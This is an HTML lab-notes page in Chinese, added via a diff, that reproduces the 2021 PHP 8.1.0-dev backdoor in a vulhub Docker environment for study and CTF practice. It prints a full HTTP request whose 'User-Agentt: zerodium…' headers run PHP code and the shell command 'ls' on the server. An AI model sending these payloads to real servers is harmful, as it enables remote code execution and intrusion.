@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title># PHP 8.1.0-dev 开发版本后门,PHP 8.1.0-dev 开发版本后门</title>
+    <link rel="stylesheet" href="/assets/css/notes.min.css">
+</head>
+<body>
+    <div class="main-content-wrapper">
+        <main class="content">
+            <h1>PHP 8.1.0-dev 开发版本后门</h1>
+<blockquote>
+<p>PHP 8.1.0-dev 版本在2021年3月28日被植入后门，但是后门很快被发现并清除。当服务器存在该后门时，攻击者可以通过发送<strong>User-Agentt</strong>头来执行任意代码。</p>
+</blockquote>
+<h2>1.漏洞环境</h2>
+<p>执行如下命令启动一个存在后门的PHP 8.1服务器：</p>
+<pre><code>docker compose up -d
+</code></pre>
+<p>环境启动后，服务运行在 <code>http://your-ip:8080</code>。</p>
+<h2>2.漏洞复现</h2>
+<p>发送如下数据包，可见代码 <code>var_dump(233*233);</code>成功执行：</p>
+<p>记得User-Agentt最后一定要加 <code>;</code> ,否则会报错</p>
+<pre><code>GET / HTTP/1.1
+Host: localhost:8080
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
+User-Agentt: zerodiumvar_dump(233*233);
+User-Agentt: zerodiumsystem(&quot;ls&quot;);
+Connection: close
+</code></pre>
+<p><a href="https://github.com/vulhub/vulhub/blob/master/php/8.1-backdoor/1.png"><img src="/0101/Cyberspace/Attack/PHP/assets/PHP8.1.0-dev%E5%90%8E%E9%97%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1.png" alt="img"></a></p>
+<p>参考链接：</p>
+<p><a href="https://cloud.tencent.com/developer/article/1839234">https://cloud.tencent.com/developer/article/1839234</a></p>
+<p><a href="https://github.com/vulhub/vulhub/blob/master/php/8.1-backdoor/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/php/8.1-backdoor/README.zh-cn.md</a></p>
+<h2>3.相关题目</h2>
+<p>qsnctf：<a href="https://www.qsnctf.com/#/main/driving-range">https://www.qsnctf.com/#/main/driving-range</a> PHP的后门</p>
+
+        </main>
+    </div>
+</body>
+</html>
